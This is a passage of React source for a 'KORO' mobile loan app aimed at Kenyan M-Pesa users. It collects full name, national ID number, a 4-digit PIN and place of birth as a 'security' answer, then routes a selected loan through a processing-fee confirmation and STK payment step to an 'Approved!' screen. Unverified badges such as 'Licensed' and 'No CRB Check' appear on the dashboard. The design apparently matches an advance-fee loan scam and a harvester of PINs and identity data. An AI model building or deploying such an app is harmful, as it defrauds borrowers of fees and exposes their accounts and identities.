          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
        <div className="success-title">Loan Approved!</div>
        <div className="success-sub">
          Congratulations <strong>{userData.name}</strong>! Your loan has been approved and will be disbursed to{" "}
          <strong>{userData.phone}</strong> within minutes.
        </div>
        <div className="success-amount-box">
          <div className="success-amount">Ksh {fmt(loan.amount)}</div>
          <div className="success-amount-sub">Disbursing to M-Pesa shortly</div>
        </div>
        <div className="success-details">
          {[
            ["Loan Amount",     `Ksh ${fmt(loan.amount)}`],
            ["Processing Fee",  `Ksh ${fmt(loan.fee)}`],
            ["Total Repayment", `Ksh ${fmt(loan.repayment)}`],
            ["Repayment Date",  repayStr],
            ["M-Pesa Number",   userData.phone],
            ["Status",          "Approved"],
          ].map(([k, v]) => (
            <div key={k} className="s-row">
              <span className="s-key">{k}</span>
              <span className="s-val" style={k === "Status" ? { color: "#22c55e" } : {}}>{v}</span>
            </div>
          ))}
        </div>
        <button className="btn-green" onClick={onDone}>
          Apply for Another Loan
        </button>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════════════
   DASHBOARD
══════════════════════════════════════════════════ */
function Dashboard({ userData, onReset }) {
  const [selected, setSelected] = useState(null);
  const [modal, setModal]       = useState("none"); // none | confirm | stk | success
  const [selLoan, setSelLoan]   = useState(null);

  const handleCardClick = (loan) => {
    setSelected(loan);
  };

  const handleGetLoan = () => {
    if (!selected) return;
    setSelLoan(selected);
    setModal("confirm");
  };

  if (modal === "success" && selLoan) {
    return (
      <SuccessScreen
        loan={selLoan}
        userData={userData}
        onDone={() => { setModal("none"); setSelected(null); setSelLoan(null); onReset(); }}
      />
    );
  }

  return (
    <div className="shell" style={{ minHeight: "100vh" }}>
      {/* Top header */}
      <div className="dash-header">
        <div className="dash-top">
          <div>
            <div className="dash-greeting">Hello, {userData.name.split(" ")[0]}</div>
            <div className="dash-sub">Choose a loan that suits you</div>
          </div>
          <div className="dash-avatar">
            {userData.name.charAt(0).toUpperCase()}
          </div>
        </div>
        <div className="logo-block" style={{ flexDirection: "row", padding: "0 0 14px", gap: 8 }}>
          <KoroLogo size={28} />
          <span className="koro-wordmark" style={{ fontSize: ".9rem" }}>KORO</span>
        </div>
      </div>

      {/* Ticker */}
      <Ticker />

      {/* Section title */}
      <div className="loan-section-title">Select Your Loan Amount</div>
      <div className="loan-sub-title">Tap a card to select, then tap Get Loan Now</div>

      {/* Loan grid */}
      <div className="loan-grid">
        {LOANS.map((loan) => (
          <div
            key={loan.amount}
            className={`loan-card${selected?.amount === loan.amount ? " selected" : ""}`}
            onClick={() => handleCardClick(loan)}
          >
            <div className="loan-amount">Ksh {fmt(loan.amount)}</div>
            <div className="loan-fee">Fee: Ksh {fmt(loan.fee)}</div>
            <div className="loan-repay">Repay: Ksh {fmt(loan.repayment)}</div>
          </div>
        ))}
      </div>

      {/* Security badges */}
      <div className="security-strip">
        {["SSL Secured","Data Protected","No CRB Check","Licensed"].map(l => (
          <div key={l} className="sec-pill">
            <div className="sec-pill-dot" />
            {l}
          </div>
        ))}
      </div>

      {/* Fixed bottom CTA */}
      <div className="dash-bottom-bar">
        <button
          className="btn-green"
          onClick={handleGetLoan}
          disabled={!selected}
          style={{ opacity: selected ? 1 : 0.45 }}
        >
          Get Loan Now
        </button>
      </div>

      {/* Modals */}
      {modal === "confirm" && selLoan && (
        <ConfirmModal
          loan={selLoan}
          userData={userData}
          onProceed={() => setModal("stk")}
          onCancel={() => setModal("none")}
        />
      )}
      {modal === "stk" && selLoan && (
        <STKModal
          loan={selLoan}
          userData={userData}
          onSuccess={() => setModal("success")}
          onCancel={() => setModal("none")}
        />
      )}
    </div>
  );
}

/* ══════════════════════════════════════════════════
   REGISTRATION STEPS
══════════════════════════════════════════════════ */

/* Step wrapper with shared top-nav */
function StepShell({ step, total = 6, onBack, children }) {
  return (
    <div className="shell" style={{ minHeight: "100vh" }}>
      <div className="step-nav">
        <button className="step-back" onClick={onBack} aria-label="Back">
          ←
        </button>
        <div className="logo-block" style={{ flexDirection: "row", padding: 0, gap: 8 }}>
          <KoroLogo size={28} />
          <span className="koro-wordmark" style={{ fontSize: ".9rem" }}>KORO</span>
        </div>
        <button className="step-chat">Chat with us</button>
      </div>
      <div className="step-number">
        Registration step {step} out of {total}
      </div>
      {children}
    </div>
  );
}

/* Step 1 — Full Name */
function Step1({ value, onChange, onNext, onBack }) {
  const [err, setErr] = useState("");
  const submit = () => {
    if (!value.trim() || value.trim().split(" ").length < 2) {
      setErr("Enter your full name as it appears on your ID");
      return;
    }
    setErr("");
    onNext();
  };
  return (
    <StepShell step={1} onBack={onBack}>
      <div className="step-body">
        <div className="step-instruction">Enter your full name from your ID card</div>
        <div className="step-example-link">(see example below)</div>
        <KenyaIDCard highlightName />
        <div className="inp-wrap">
          <input
            className={`koro-inp${err ? " err" : ""}`}
            type="text"
            placeholder="Full Name"
            value={value}
            onChange={e => { onChange(e.target.value); setErr(""); }}
            autoFocus
          />
          {err && <div className="ferr">{err}</div>}
        </div>
        <button className="btn-continue" onClick={submit}>Continue</button>
      </div>
    </StepShell>
  );
}

/* Step 2 — National ID */
function Step2({ value, onChange, onNext, onBack }) {
  const [err, setErr] = useState("");
  const submit = () => {
    if (!value.trim().match(/^\d{7,8}$/)) {
      setErr("Enter a valid 7–8 digit ID number");
      return;
    }
    setErr("");
    onNext();
  };
  return (
    <StepShell step={2} onBack={onBack}>
      <div className="step-body">
        <div className="step-instruction">Enter your ID number from your ID card</div>
        <div className="step-example-link">(see example below)</div>
        <KenyaIDCard highlightId />
        <div className="inp-wrap">
          <input
            className={`koro-inp${err ? " err" : ""}`}
            type="text"
            inputMode="numeric"
            placeholder="National ID"
            value={value}
            onChange={e => { onChange(e.target.value.replace(/\D/g, "").slice(0, 8)); setErr(""); }}
          />
          {err && <div className="ferr">{err}</div>}
        </div>
        <button className="btn-continue" onClick={submit}>Continue</button>
      </div>
    </StepShell>
  );
}

/* Step 3 — PIN */
function Step3({ value, onChange, onNext, onBack }) {
  const [err, setErr]     = useState("");
  const [show, setShow]   = useState(false);
  const submit = () => {
    if (!value.match(/^\d{4}$/)) {
      setErr("Enter a 4-digit PIN");
      return;
    }
    setErr("");
    onNext();
  };
  return (
    <StepShell step={3} onBack={onBack}>
      <div className="step-body">
        <div style={{ marginBottom: 8 }}>
          <div style={{ fontSize: "1.2rem", fontWeight: 800, color: "#111", marginBottom: 6 }}>Secure your account</div>
          <div style={{ fontSize: 14, color: "#444", lineHeight: 1.65 }}>
            Enter your PIN below, which will be used to log in to the Koro app and will serve as your security key
          </div>
        </div>
        <div className="inp-wrap" style={{ marginTop: 20 }}>
          <div className={`pin-inp-wrap${err ? " err" : ""}`}>
            <div className="pin-eye" onClick={() => setShow(s => !s)}>
              <svg viewBox="0 0 24 24">
                {show
                  ? <><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></>
                  : <><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></>
                }
              </svg>
            </div>
            <input
              className="pin-inp"
              type={show ? "text" : "password"}
              inputMode="numeric"
              maxLength={4}
              placeholder="4-digit PIN"
              value={value}
              onChange={e => { onChange(e.target.value.replace(/\D/g, "").slice(0, 4)); setErr(""); }}
            />
          </div>
          {err && <div className="ferr">{err}</div>}
        </div>
        <button className="btn-continue" onClick={submit} style={{ marginTop: 8 }}>Continue</button>
      </div>
    </StepShell>
  );
}

/* Step 4 — Place of Birth */
function Step4({ value, onChange, onNext, onBack }) {
  const [err, setErr] = useState("");
  const submit = () => {
    if (!value.trim() || value.trim().length < 3) {
      setErr("Enter your place of birth");
      return;
    }
    setErr("");
    onNext();
  };
  return (
    <StepShell step={4} onBack={onBack}>
      <div className="step-body">
        <div style={{ marginBottom: 8 }}>
          <div style={{ fontSize: "1.2rem", fontWeight: 800, color: "#111", marginBottom: 6 }}>Secure your account</div>
          <div style={{ fontSize: 14, color: "#444", lineHeight: 1.65 }}>
            Enter your place of birth below, which will be needed if you forget your PIN.
          </div>
        </div>
        <div className="inp-wrap" style={{ marginTop: 20 }}>
          <input
            className={`koro-inp${err ? " err" : ""}`}
            type="text"
            placeholder="Place of Birth"
            value={value}
            onChange={e => { onChange(e.target.value); setErr(""); }}
          />
          {err && <div className="ferr">{err}</div>}
        </div>
        <button className="btn-continue" onClick={submit} style={{ marginTop: 8 }}>Continue</button>
      </div>
    </StepShell>
  );
}

/* Step 5 — Phone */
function Step5({ value, onChange, onNext, onBack }) {
  const [err, setErr] = useState("");
  const submit = () => {
    if (!isValidPhone(value)) {
      setErr("Enter a valid Safaricom or Airtel number");
      return;
    }
    setErr("");
    onNext();
  };
  return (
    <StepShell step={5} onBack={onBack}>
      <div className="step-body">
        <div className="logo-block" style={{ marginBottom: 16 }}>
          <KoroLogo size={64} />
          <span className="koro-wordmark">KORO</span>
        </div>
        <div className="inp-wrap" style={{ marginTop: 8 }}>
          <div style={{ fontSize: 12, color: "#888", marginBottom: 5, fontWeight: 600 }}>
            Enter your mobile number
          </div>
          <div className={`phone-inp-wrap${err ? " err" : ""}`}>
            <div className="phone-icon">
              <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12" y2="18"/></svg>
            </div>
            <input
              className="phone-inp"
              type="tel"
              inputMode="numeric"
              placeholder="+254 (0) 7XX-XXX-XXX"
              value={value}
              onChange={e => { onChange(e.target.value.replace(/[^\d+\s\-()]/g, "").slice(0, 16)); setErr(""); }}
            />
          </div>
          {err && <div className="ferr">{err}</div>}
        </div>
        <button className="btn-continue" onClick={submit}>Next</button>
        <div className="returning-notice" style={{ marginTop: 20 }}>
          FOR RETURNING CLIENTS: remember to log in with the phone number you registered with!
        </div>
      </div>
    </StepShell>
  );
}

/* Step 6 — Loan Type */
function Step6({ value, onChange, onNext, onBack }) {
  const [err, setErr] = useState("");
  const submit = () => {
    if (!value) {
      setErr("Please select a loan type");
      return;
    }
    setErr("");
    onNext();
  };
  return (
    <StepShell step={6} onBack={onBack}>
      <div className="step-body">
        <div style={{ fontSize: "1.2rem", fontWeight: 800, color: "#111", marginBottom: 6 }}>
          What is this loan for?
        </div>
        <div style={{ fontSize: 14, color: "#6b7280", marginBottom: 22, lineHeight: 1.6 }}>
          Select the loan type that best describes your need. This helps us match you with the right offer.
        </div>
        <div className="inp-wrap">
          <select
            className={`koro-sel${err ? " err" : ""}`}
            value={value}
            onChange={e => { onChange(e.target.value); setErr(""); }}
          >
            <option value="">Select Loan Type</option>
            {LOAN_TYPES.map(t => <option key={t} value={t}>{t}</option>)}
          </select>
          {err && <div className="ferr">{err}</div>}
        </div>
        <div style={{ display: "flex", flexDirection: "column", gap: 8, marginBottom: 22 }}>
          {LOAN_TYPES.map(t => (
            <div
              key={t}
              onClick={() => { onChange(t); setErr(""); }}
              style={{
                padding: "13px 16px",
                border: `1.5px solid ${value === t ? "#22c55e" : "#e5e7eb"}`,
                borderRadius: 10,
                cursor: "pointer",
                fontSize: 14,
                fontWeight: 600,
                color: value === t ? "#22c55e" : "#374151",
                background: value === t ? "#f0fdf4" : "#fff",
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                transition: "all .15s",
              }}
            >
              {t}
              {value === t && <span style={{ color: "#22c55e", fontWeight: 900 }}>✓</span>}
            </div>
          ))}
        </div>
        <button className="btn-continue" onClick={submit}>Continue</button>
      </div>
    </StepShell>
  );
}

/* ══════════════════════════════════════════════════
   SPLASH SCREEN
══════════════════════════════════════════════════ */
function Splash({ onStart }) {
  return (
    <div className="shell splash" style={{ minHeight: "100vh" }}>
      <div className="splash-bg-img" />
      <div className="splash-bg" />
      <div className="splash-content">
        <KoroLogo size={72} white />
        <div className="splash-logo-text">KORO</div>
        <div className="splash-headline">
          SAY HELLO TO <em>EASY LENDING</em>
        </div>
      </div>
      <div className="splash-bottom">
        <button className="btn-green" onClick={onStart} style={{ fontSize: 16, letterSpacing: ".12em" }}>
          GET STARTED
        </button>
        <div className="splash-terms">
          Terms and conditions apply:{" "}
          <a href="#">Terms &amp; Conditions</a>,{" "}
          <a href="#">Terms of Use</a>,{" "}
          <a href="#">Affiliation Policy</a>,{" "}
          <a href="#">PEP statement</a> and{" "}
          <a href="#">Privacy Policy</a>
        </div>
        <div className="splash-legal">
          Representative Example For First Loan: a 61-day loan with principal amount of KSh 1,000,
          the interest would be KSh 390 and the total amount due would be KSh 1,390.
        </div>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════════════
   ROOT APP
══════════════════════════════════════════════════ */
export default function KoroApp() {
  /* screen: splash | s1 | s2 | s3 | s4 | s5 | s6 | dashboard */
  const [screen, setScreen] = useState("splash");

  const [formData, setFormData] = useState({
    name:     "",
    idNumber: "",
    pin:      "",
    birthPlace: "",
    phone:    "",
    loanType: "",
  });

  const set = (key) => (val) => setFormData(p => ({ ...p, [key]: val }));

  const goBack = (to) => () => setScreen(to);

  const reset = () => {
    setFormData({ name:"", idNumber:"", pin:"", birthPlace:"", phone:"", loanType:"" });
    setScreen("splash");
  };

  return (
    <>
      <style>{CSS}</style>

      {screen === "splash" && <Splash onStart={() => setScreen("s1")} />}

      {screen === "s1" && (
        <Step1
          value={formData.name}
          onChange={set("name")}
          onNext={() => setScreen("s2")}
          onBack={goBack("splash")}
        />
      )}

      {screen === "s2" && (
        <Step2
          value={formData.idNumber}
          onChange={set("idNumber")}
          onNext={() => setScreen("s3")}
          onBack={goBack("s1")}
        />
      )}

      {screen === "s3" && (
        <Step3
          value={formData.pin}
          onChange={set("pin")}
          onNext={() => setScreen("s4")}
          onBack={goBack("s2")}
        />
      )}

      {screen === "s4" && (
        <Step4
          value={formData.birthPlace}
          onChange={set("birthPlace")}
          onNext={() => setScreen("s5")}
          onBack={goBack("s3")}
        />
      )}

      {screen === "s5" && (
        <Step5
          value={formData.phone}
          onChange={set("phone")}
          onNext={() => setScreen("s6")}
          onBack={goBack("s4")}
        />
      )}

      {screen === "s6" && (
        <Step6
          value={formData.loanType}
          onChange={set("loanType")}
          onNext={() => setScreen("dashboard")}
          onBack={goBack("s5")}
        />
      )}

      {screen === "dashboard" && (
        <Dashboard userData={formData} onReset={reset} />
      )}
    </>
  );
}